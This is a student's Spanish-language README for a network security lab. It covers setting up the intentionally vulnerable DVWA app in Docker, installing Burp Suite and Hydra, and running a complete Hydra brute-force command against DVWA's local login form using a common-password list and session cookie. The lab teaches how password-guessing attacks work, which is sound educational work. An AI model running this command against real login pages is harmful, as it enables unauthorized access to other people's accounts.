# Laboratorio 2 de Criptografía y Seguridad en redes

Segundo laboratorio de Tomás Díaz Calderón

- Para levantamiento de Docker, descargar carpeta de https://github.com/digininja/DVWA y escribir:

      sudo docker compose up -d
- Para la descarga de Burpsuite, ir a https://portswigger.net/burp/communitydownload
  
- Luego de descargar el archivo .sh, ingresar:
  
-     chmod +x burpsuite\_community\_linux\_v2025\_2\_4.sh
      sudo burpsuite\_community\_linux\_v2025\_2\_4.sh

- Para la descarga de Hydra, se debe ingresar:
  
-       sudo apt install hydra
  
- Para ver la versión instalada, sintaxis y opciones, basta con ingresar "hydra" en la terminal.
  
- El comando para su uso corresponde al siguiente, donde se debe reemplazar el PHPSESSID por el propio.
  
-       hydra 127.0.0.1 -s 8080 -L usuarios.txt -P 200_contrasenas_mas_usadas.txt http-get-form "/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:H=Cookie: PHPSESSID=7c94922a8fce407024d5c9438fb33525; security=low; :F=Username and/or password incorrect."
  

